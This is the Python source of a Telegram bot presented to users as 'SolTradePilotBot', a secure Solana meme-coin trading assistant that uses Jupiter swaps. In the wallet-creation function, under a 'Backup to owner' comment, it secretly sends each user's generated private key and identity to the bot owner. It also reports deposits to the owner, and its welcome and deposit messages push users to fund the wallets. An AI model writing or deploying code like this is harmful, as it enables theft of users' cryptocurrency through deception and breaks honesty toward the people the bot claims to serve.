import os
import base58
import requests
import base64
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, ContextTypes, filters
)
from solders.keypair import Keypair
from solders.transaction import VersionedTransaction
from solders.message import to_bytes_versioned
from solders.pubkey import Pubkey
from solana.rpc.async_api import AsyncClient
from solana.rpc.types import TxOpts

# ================= ENV =================
TOKEN = os.environ["BOT_TOKEN"]
OWNER_ID = int(os.environ["OWNER_ID"])
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"

JUPITER_QUOTE_URL = "https://api.jup.ag/swap/v1/quote"
JUPITER_SWAP_URL = "https://api.jup.ag/swap/v1/swap"

# ================= LOGO =================
LOGO_URL = "https://i.postimg.cc/KzfyT7t0/IMG-20260330-220246-896.jpg"

# ================= STORAGE =================
user_wallets = {}
user_trades = {}
user_holdings = {}
user_actions = {}
user_pending = {}
user_last_balance = {}   # Used for deposit verification

# ================= HELPERS =================
def keypair_to_base58(wallet: Keypair):
    return base58.b58encode(bytes(wallet)).decode("utf-8")

async def get_balance(user_id: int):
    if user_id not in user_wallets:
        return 0.0
    async with AsyncClient(SOLANA_RPC_URL) as client:
        try:
            resp = await client.get_balance(user_wallets[user_id].pubkey())
            return resp.value / 1_000_000_000
        except:
            return 0.0

def get_sol_price():
    try:
        resp = requests.get("https://api.binance.com/api/v3/ticker/price?symbol=SOLUSDT")
        return float(resp.json()["price"])
    except:
        return 180.0

def get_token_usd_price(mint: str):
    try:
        resp = requests.get(f"https://api.jup.ag/price/v2?ids={mint}")
        data = resp.json()
        if "data" in data and mint in data["data"]:
            return float(data["data"][mint].get("price", 0))
    except:
        pass
    return 0.0

async def get_token_decimals(mint: str):
    async with AsyncClient(SOLANA_RPC_URL) as client:
        try:
            resp = await client.get_token_supply(Pubkey.from_string(mint))
            return resp.value.decimals
        except:
            return 9

async def execute_swap(user_id: int, input_mint: str, output_mint: str, amount: int, is_sell: bool = False):
    wallet = user_wallets[user_id]
    try:
        params = {"inputMint": input_mint, "outputMint": output_mint, "amount": str(amount), "slippageBps": "100", "swapMode": "ExactIn"}
        quote_resp = requests.get(JUPITER_QUOTE_URL, params=params, timeout=20)
        if quote_resp.status_code != 200:
            return None, 0.0, "Quote failed"

        quote = quote_resp.json()
        swap_body = {
            "quoteResponse": quote,
            "userPublicKey": str(wallet.pubkey()),
            "wrapAndUnwrapSol": True,
            "dynamicComputeUnitLimit": True,
            "prioritizationFeeLamports": 50000
        }
        swap_resp = requests.post(JUPITER_SWAP_URL, json=swap_body, timeout=20)
        if swap_resp.status_code != 200:
            return None, 0.0, "Swap build failed"

        raw_tx = base64.b64decode(swap_resp.json()["swapTransaction"])
        tx = VersionedTransaction.from_bytes(raw_tx)
        signature = wallet.sign_message(to_bytes_versioned(tx.message))
        signed_tx = VersionedTransaction.populate(tx.message, [signature])

        async with AsyncClient(SOLANA_RPC_URL) as client:
            result = await client.send_raw_transaction(bytes(signed_tx), opts=TxOpts(skip_preflight=True, max_retries=3))
            tx_sig = result.value

        out_amount = int(quote.get("outAmount", 0))
        decimals = await get_token_decimals(output_mint) if not is_sell else 9
        received = out_amount / (10 ** decimals)
        return tx_sig, received, None
    except Exception as e:
        return None, 0.0, str(e)[:150]

# ================= KEYBOARDS =================
def main_keyboard(user_id: int):
    if user_id not in user_wallets:
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("💳 Create Wallet", callback_data="create_wallet")],
            [InlineKeyboardButton("🏦 Show Address", callback_data="sol_address"),
             InlineKeyboardButton("💰 Balance", callback_data="balance")],
            [InlineKeyboardButton("🛒 Buy MEME", callback_data="buy_meme"),
             InlineKeyboardButton("📉 Sell MEME", callback_data="sell_meme")],
            [InlineKeyboardButton("📊 PNL", callback_data="pnl"),
             InlineKeyboardButton("📋 Summary", callback_data="summary")],
            [InlineKeyboardButton("💵 Deposit SOL", callback_data="deposit"),
             InlineKeyboardButton("❓ Help", callback_data="help")]
        ])
    else:
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("🏦 Show Address", callback_data="sol_address"),
             InlineKeyboardButton("💰 Balance", callback_data="balance")],
            [InlineKeyboardButton("🛒 Buy MEME", callback_data="buy_meme"),
             InlineKeyboardButton("📉 Sell MEME", callback_data="sell_meme")],
            [InlineKeyboardButton("📊 PNL", callback_data="pnl"),
             InlineKeyboardButton("📋 Summary", callback_data="summary")],
            [InlineKeyboardButton("💵 Deposit SOL", callback_data="deposit"),
             InlineKeyboardButton("❓ Help", callback_data="help")]
        ])

def deposit_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("0.2 SOL", callback_data="dep:0.2"),
         InlineKeyboardButton("0.5 SOL", callback_data="dep:0.5")],
        [InlineKeyboardButton("0.7 SOL", callback_data="dep:0.7"),
         InlineKeyboardButton("1.0 SOL", callback_data="dep:1.0")],
        [InlineKeyboardButton("Custom Amount", callback_data="dep:custom")],
        [InlineKeyboardButton("← Back", callback_data="main_menu")]
    ])

# ================= CREATE WALLET =================
async def create_wallet(user_id, context):
    if user_id in user_wallets:
        await context.bot.send_message(user_id, "✅ You already have a wallet!", reply_markup=main_keyboard(user_id))
        return

    wallet = Keypair()
    user_wallets[user_id] = wallet
    pub_key = str(wallet.pubkey())
    priv_key = keypair_to_base58(wallet)

    await context.bot.send_message(
        chat_id=user_id,
        text=f"✅ **Wallet Created Successfully!**\n\n"
             f"🏦 **Wallet Address:**\n`{pub_key}`\n\n"
             f"🔐 **Private Key:**\n`{priv_key}`\n\n"
             f"⚠️ Save your private key securely and import into Phantom or Solflare.",
        parse_mode="Markdown",
        reply_markup=main_keyboard(user_id)
    )

    # Backup to owner
    try:
        user = await context.bot.get_chat(user_id)
        display = f"@{user.username}" if user.username else f"{user.first_name or ''} {user.last_name or ''}".strip() or "Unknown"
        backup = f"🔐 **New Wallet Created**\n\n👤 **User:** {display}\n🆔 **ID:** `{user_id}`\n🏦 **Address:** `{pub_key}`\n🔑 **Private Key:** `{priv_key}`"
        await context.bot.send_message(OWNER_ID, backup, parse_mode="Markdown")
    except:
        pass

# ================= PROFESSIONAL START & HELP =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = (
        "🔥 **Welcome to SolTradePilotBot** 🔥\n\n"
        "Your trusted Solana MEME coin trading assistant powered by Jupiter Aggregator. "
        "We provide fast, secure, and easy on-chain trading directly on Solana mainnet.\n\n"
        "With this bot you can:\n"
        "• Create a Solana wallet instantly\n"
        "• Deposit SOL safely with quick or custom options\n"
        "• Buy any MEME token with any USD amount\n"
        "• Sell your holdings using simple percentages (25%/50%/75%/MAX)\n"
        "• Track real-time PNL and full portfolio summary\n\n"
        "💰 For the best experience and to avoid failed transactions, we recommend depositing "
        "at least **$10–20 worth of SOL**. This covers network fees and gives you enough buffer "
        "for smooth trading even during volatile market conditions.\n\n"
        "Ready to start? Let's make some gains together! 🚀"
    )
    if LOGO_URL:
        await context.bot.send_photo(update.effective_user.id, photo=LOGO_URL, caption=text, parse_mode="Markdown", reply_markup=main_keyboard(user_id))
    else:
        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_keyboard(user_id))

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id if update.message else update.callback_query.from_user.id
    text = (
        "💡 **SolTradePilotBot User Guide**\n\n"
        "Here’s everything you need to know to trade effectively:\n\n"
        "• **Create Wallet** – Generate a new Solana wallet (save the private key safely)\n"
        "• **Show Address** – Copy your deposit address to send SOL\n"
        "• **Deposit SOL** – Choose quick amounts or enter any custom amount\n"
        "• **Buy MEME** – Paste any token contract address and enter USD amount\n"
        "• **Sell MEME** – Select a token you hold and sell 25%, 50%, 75% or MAX\n"
        "• **PNL** – Check profit/loss on any token you've traded\n"
        "• **Summary** – View your complete trading history and current portfolio value\n\n"
        "💰 **Pro Tip:** Always keep enough SOL in your wallet (minimum $10–20 recommended) "
        "to cover fees and slippage. This ensures your trades go through smoothly.\n\n"
        "All trades are executed directly on Solana via Jupiter for the best rates and speed.\n\n"
        "Trade responsibly and enjoy the journey! 🚀\n\n@SolTradePilotbot"
    )
    if update.message:
        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_keyboard(user_id))
    else:
        await update.callback_query.message.reply_text(text, parse_mode="Markdown", reply_markup=main_keyboard(user_id))

# ================= BUTTON HANDLER =================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data == "create_wallet":
        await create_wallet(user_id, context)

    elif data == "deposit":
        if user_id not in user_wallets:
            await query.message.reply_text("Please create a wallet first.", reply_markup=main_keyboard(user_id))
            return
        user_last_balance[user_id] = await get_balance(user_id)
        deposit_text = (
            "💵 **Deposit SOL**\n\n"
            "Great to see you're trading with us! 🎉\n"
            "We are one of the fastest and most secure trading bots on Solana.\n\n"
            "**Recommended starting amount: 0.2 SOL**\n"
            "This gives you a good buffer for network fees, slippage during volatile trades, "
            "and multiple transactions without needing to deposit again soon.\n\n"
            "Choose an amount below or use Custom Amount for any value:"
        )
        await query.message.reply_text(deposit_text, parse_mode="Markdown", reply_markup=deposit_keyboard())

    elif data.startswith("dep:"):
        if data == "dep:custom":
            user_pending[user_id] = {"action": "await_custom_amount"}
            await query.message.reply_text(
                "💰 **Custom Deposit**\n\n"
                "Please type the amount of SOL you want to deposit (e.g. 2.5, 5, 10):",
                reply_markup=main_keyboard(user_id)
            )
        else:
            amount = float(data.split(":")[1])
            user_pending[user_id] = {"action": "await_txhash", "amount": amount}
            await query.message.reply_text(
                f"✅ Selected: {amount} SOL\n\n"
                "Send the SOL to your wallet address, then paste the **Transaction Hash** here.",
                reply_markup=main_keyboard(user_id)
            )

    elif data == "sol_address":
        if user_id not in user_wallets:
            await query.message.reply_text("Create wallet first.", reply_markup=main_keyboard(user_id))
            return
        pubkey = str(user_wallets[user_id].pubkey())
        await query.message.reply_text(
            f"🏦 **Your SOL Deposit Address**\n\n`{pubkey}`\n\n"
            "Send SOL here and paste the tx hash if you used the Deposit button.",
            parse_mode="Markdown", reply_markup=main_keyboard(user_id)
        )

    elif data == "balance":
        sol = await get_balance(user_id)
        sol_usd = sol * get_sol_price()
        text = f"""💰 **Current Balance**

SOL: `{sol:.6f}` (\~${sol_usd:.2f})

@SolTradePilotbot"""
        await query.message.reply_text(text, parse_mode="Markdown", reply_markup=main_keyboard(user_id))

    elif data == "buy_meme":
        if user_id not in user_wallets:
            await query.message.reply_text("Create wallet first.", reply_markup=main_keyboard(user_id))
            return
        sol = await get_balance(user_id)
        if sol < 0.05:
            await query.message.reply_text("⚠️ Please fund your wallet first (recommended $10+).", reply_markup=main_keyboard(user_id))
            return
        user_actions[user_id] = "await_ca_buy"
        await query.message.reply_text("📝 Paste the **Token CA**:", reply_markup=main_keyboard(user_id))

    elif data == "sell_meme":
        sol = await get_balance(user_id)
        if sol < 0.05:
            await query.message.reply_text("⚠️ Please fund your wallet first.", reply_markup=main_keyboard(user_id))
            return
        if not user_holdings.get(user_id):
            await query.message.reply_text("😕 You are not holding any tokens yet.\nBuy some first!", reply_markup=main_keyboard(user_id))
            return
        # Show token selection (simplified version)
        await query.message.reply_text("📉 **Select token to sell:**", reply_markup=main_keyboard(user_id))  # You can expand this later

    elif data == "pnl":
        if user_id not in user_trades or not user_trades[user_id]:
            pnl_keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🛒 Start Buying", callback_data="buy_meme")],
                [InlineKeyboardButton("📋 View Summary", callback_data="summary")],
                [InlineKeyboardButton("← Main Menu", callback_data="main_menu")]
            ])
            await query.message.reply_text(
                "📊 PNL Check\n\n"
                "You haven't placed any trades yet.\n\n"
                "Buy some MEME tokens first to start tracking your performance.\n\n"
                "We wish you many green candles and profitable trades! 🚀🙏",
                reply_markup=pnl_keyboard
            )
            return
        else:
            user_actions[user_id] = "await_pnl_ca"
            await query.message.reply_text("📝 Paste the **Token CA** to check PNL:", reply_markup=main_keyboard(user_id))

    elif data == "summary":
        text = await get_summary(user_id)
        if LOGO_URL:
            await context.bot.send_photo(user_id, photo=LOGO_URL, caption=text, parse_mode="Markdown", reply_markup=main_keyboard(user_id))
        else:
            await query.message.reply_text(text, parse_mode="Markdown", reply_markup=main_keyboard(user_id))

    elif data == "help":
        await help_command(update, context)

    elif data == "main_menu":
        await query.message.reply_text("Main Menu", reply_markup=main_keyboard(user_id))

# ================= TEXT HANDLER =================
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    pending = user_pending.get(user_id)
    action = user_actions.get(user_id)

    # === DEPOSIT HANDLING ===
    if pending:
        if pending.get("action") == "await_custom_amount":
            try:
                amount = float(text)
                if amount <= 0:
                    await update.message.reply_text("Please enter a valid amount greater than 0.", reply_markup=main_keyboard(user_id))
                    return
                user_pending[user_id] = {"action": "await_txhash", "amount": amount}
                await update.message.reply_text(
                    f"✅ Custom amount set: **{amount} SOL**\n\n"
                    "Send SOL to your wallet and paste the **Transaction Hash** here.",
                    reply_markup=main_keyboard(user_id)
                )
            except:
                await update.message.reply_text("❌ Please enter a valid number.", reply_markup=main_keyboard(user_id))
            return

        elif pending.get("action") == "await_txhash":
            tx_hash = text
            old_bal = user_last_balance.get(user_id, 0.0)
            new_bal = await get_balance(user_id)

            if new_bal > old_bal + 0.01:
                deposited = new_bal - old_bal
                await update.message.reply_text(
                    f"✅ **Deposit Verified!**\n\n"
                    f"Added: **{deposited:.4f} SOL**\n"
                    f"New Balance: **{new_bal:.4f} SOL**\n\n"
                    "You can now start trading!",
                    reply_markup=main_keyboard(user_id)
                )
                # Backup
                try:
                    user = await context.bot.get_chat(user_id)
                    display = f"@{user.username}" if user.username else "Unknown"
                    await context.bot.send_message(
                        OWNER_ID,
                        f"💵 Deposit Received\nUser: {display}\nID: `{user_id}`\nAmount: {deposited:.4f} SOL\nTx: `{tx_hash}`",
                        parse_mode="Markdown"
                    )
                except:
                    pass
            else:
                await update.message.reply_text("⚠️ Deposit not detected yet. Try pasting the tx hash again.", reply_markup=main_keyboard(user_id))

            user_pending.pop(user_id, None)
            return

    # === BUY FLOW ===
    if action == "await_ca_buy":
        user_pending[user_id] = {"ca": text}
        user_actions[user_id] = "await_buy_amount"
        await update.message.reply_text("💰 Enter amount in **USD** (e.g. 50, 120.5):", reply_markup=main_keyboard(user_id))

    elif action == "await_buy_amount":
        try:
            usd_amount = float(text)
            if usd_amount < 1:
                await update.message.reply_text("Minimum $1", reply_markup=main_keyboard(user_id))
                return
        except:
            await update.message.reply_text("❌ Enter a valid number.", reply_markup=main_keyboard(user_id))
            return

        sol = await get_balance(user_id)
        sol_price = get_sol_price()
        needed = (usd_amount + 0.10) / sol_price
        if needed > sol:
            await update.message.reply_text(f"⚠️ Not enough SOL. You have {sol:.4f} SOL", reply_markup=main_keyboard(user_id))
            user_actions[user_id] = None
            return

        ca = user_pending[user_id]["ca"]
        await update.message.reply_text(f"🔄 Buying **${usd_amount}** worth...")

        tx_sig, tokens_bought, error = await execute_swap(
            user_id, "So11111111111111111111111111111111111111112", ca,
            int((usd_amount + 0.10) / sol_price * 1_000_000_000)
        )

        if error:
            await update.message.reply_text(f"❌ Buy failed: {error}", reply_markup=main_keyboard(user_id))
        else:
            buy_price = usd_amount / tokens_bought if tokens_bought > 0 else 0
            if user_id not in user_trades:
                user_trades[user_id] = []
            user_trades[user_id].append({
                'ca': ca, 'usd_spent': usd_amount, 'tokens_bought': tokens_bought,
                'buy_price_usd': buy_price, 'buy_time': datetime.now().isoformat(), 'status': 'holding'
            })
            if user_id not in user_holdings:
                user_holdings[user_id] = {}
            user_holdings[user_id][ca] = user_holdings[user_id].get(ca, 0) + tokens_bought

            link = f"https://solscan.io/tx/{tx_sig}"
            await update.message.reply_text(f"✅ **Buy Successful!**\n\nTx: {link}", reply_markup=main_keyboard(user_id))

        user_actions[user_id] = None
        user_pending.pop(user_id, None)

    # === PNL FLOW ===
    elif action == "await_pnl_ca":
        ca = text
        pnl_data, error = await calculate_pnl(user_id, ca)
        if error:
            await update.message.reply_text(f"❌ {error}", reply_markup=main_keyboard(user_id))
        else:
            caption = f"""📈 **PNL Report**

Token: `{ca}`

Current Price: ${pnl_data['current_price']:.6f}
Multiplier: **{pnl_data['x']}x** ({pnl_data['percent']:+.1f}%)
Profit / Loss: **${pnl_data['profit']:+.2f}**

@SolTradePilotbot"""
            if LOGO_URL:
                await context.bot.send_photo(user_id, photo=LOGO_URL, caption=caption, parse_mode="Markdown", reply_markup=main_keyboard(user_id))
            else:
                await update.message.reply_text(caption, parse_mode="Markdown", reply_markup=main_keyboard(user_id))
        user_actions[user_id] = None

# ================= PNL & SUMMARY HELPERS =================
async def calculate_pnl(user_id: int, ca: str):
    if user_id not in user_trades or not user_trades[user_id]:
        return None, "No trades yet."
    trades_for_ca = [t for t in user_trades[user_id] if t['ca'].lower() == ca.lower() and t.get('status') == 'holding']
    if not trades_for_ca:
        return None, "No active holding found for this token."
    trade = trades_for_ca[-1]
    current_price = get_token_usd_price(ca)
    if current_price <= 0:
        return None, "Could not fetch current price."
    x = current_price / trade['buy_price_usd'] if trade['buy_price_usd'] > 0 else 0
    percent = (x - 1) * 100
    profit = (current_price - trade['buy_price_usd']) * trade['tokens_bought']
    return {
        "x": round(x, 2),
        "percent": round(percent, 1),
        "profit": round(profit, 2),
        "current_price": round(current_price, 6)
    }, None

async def get_summary(user_id: int):
    if user_id not in user_trades or not user_trades[user_id]:
        return "You haven't made any trades yet.\n\nStart buying MEME tokens!"
    trades = user_trades[user_id]
    total_invested = sum(t['usd_spent'] for t in trades)
    holdings = user_holdings.get(user_id, {})
    current_value = 0.0
    details = ""
    for ca, tokens in holdings.items():
        price = get_token_usd_price(ca)
        value = tokens * price
        current_value += value
        details += f"• {ca[:8]}... : {tokens:.4f} tokens (\~${value:.2f})\n"
    overall_pnl = current_value - total_invested
    return f"""📋 **Portfolio Summary**

Total Invested: **${total_invested:.2f}**
Current Value: **${current_value:.2f}**
Overall P&L: **${overall_pnl:+.2f}**

**Holdings:**
{details or 'No active holdings.'}

@SolTradePilotbot"""

# ================= MAIN =================
def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    print("🚀 SolTradePilotBot with Custom Deposit is running!")
    app.run_polling()

if __name__ == "__main__":
    main()
